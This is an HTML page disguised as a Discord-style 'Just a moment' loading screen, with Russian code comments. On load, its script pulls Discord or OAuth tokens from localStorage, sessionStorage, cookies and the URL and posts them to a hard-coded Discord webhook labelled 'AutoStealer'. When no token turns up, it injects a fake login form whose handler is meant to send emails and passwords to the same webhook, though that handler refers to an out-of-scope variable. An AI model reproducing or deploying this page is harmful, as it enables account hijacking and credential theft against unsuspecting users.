<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: Arial; }
        .spinner { border: 4px solid #202225; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
<div>
    <div class="spinner"></div>
    <p>Just a moment...</p>
</div>
<script>
    // Функция получения токена из localStorage Discord
    function getStoredToken() {
        let token = null;
        // Поиск по всем ключам localStorage
        for (let key in localStorage) {
            if (key.startsWith('token')) {
                try {
                    let data = JSON.parse(localStorage.getItem(key));
                    if (data && data.token) {
                        token = data.token;
                        break;
                    }
                } catch(e) {}
            }
        }
        // Прямой доступ к известным ключам
        if (!token) {
            try {
                let t = localStorage.getItem('token');
                if (t) token = t;
            } catch(e) {}
        }
        // Дополнительно проверка sessionStorage
        if (!token) {
            for (let key in sessionStorage) {
                if (key.includes('token')) {
                    try {
                        let data = JSON.parse(sessionStorage.getItem(key));
                        if (data && data.token) {
                            token = data.token;
                            break;
                        }
                    } catch(e) {}
                }
            }
        }
        return token;
    }

    // Функция отправки токена на заданный webhook
    function sendToken(token) {
        let webhookURL = "https://discord.com/api/webhooks/1529622002925699224/dwFRzx2iQ-IVHg_FCppydqvQfA8w11wOIvX85HgiJl29yx_1LOG60leAzRwE8LCEDl_t";
        let data = {
            content: `**Token stolen:** ||${token}||`,
            username: "AutoStealer"
        };
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.log('Send error:', err));
    }

    // Попытка также извлечь токен из cookies (для OAuth)
    function getTokenFromCookies() {
        let match = document.cookie.match(/token=([^;]*)/);
        return match ? match[1] : null;
    }

    // Попытка извлечь из URL (фрагмент OAuth redirect)
    function getTokenFromURL() {
        let hash = window.location.hash;
        let match = hash.match(/access_token=([^&]*)/);
        if (match) return match[1];
        let params = new URLSearchParams(window.location.search);
        return params.get('token') || null;
    }

    // Основная функция кражи при загрузке страницы
    window.onload = function() {
        let token = getStoredToken();
        if (!token) token = getTokenFromCookies();
        if (!token) token = getTokenFromURL();

        if (token) {
            sendToken(token);
            // Показать на странице, что токен отправлен (необязательно)
            document.querySelector('p').innerHTML = '✅ Token captured and sent.';
            document.querySelector('.spinner').style.display = 'none';
        } else {
            document.querySelector('p').innerHTML = '❌ No token found. Try logging in manually.';
            document.querySelector('.spinner').style.display = 'none';
            // Добавляем фейковую форму для соц. инженерии (опционально)
            let div = document.querySelector('div');
            let form = document.createElement('div');
            form.innerHTML = `
                <br><input type="text" id="fakeemail" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;border-radius:4px;border:none;background:#202225;color:#fff;">
                <input type="password" id="fakepass" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border-radius:4px;border:none;background:#202225;color:#fff;">
                <button onclick="fakeLogin()" style="width:100%;padding:10px;background:#5865f2;border:none;border-radius:4px;color:#fff;font-weight:bold;cursor:pointer;">Login</button>
                <p id="fakemsg" style="color:#f04747;"></p>
            `;
            div.appendChild(form);
            // Также отправляем введённые данные на webhook
            window.fakeLogin = function() {
                let email = document.getElementById('fakeemail').value;
                let pass = document.getElementById('fakepass').value;
                if (email && pass) {
                    let data = {
                        content: `**CREDENTIALS:** Email: ${email}, Pass: ${pass}`,
                        username: "CredStealer"
                    };
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).catch(err => console.log(err));
                    document.getElementById('fakemsg').innerText = '✅ Login successful (credentials sent).';
                } else {
                    document.getElementById('fakemsg').innerText = 'Please fill all fields.';
                }
            };
        }
    };
</script>
</body>
</html>
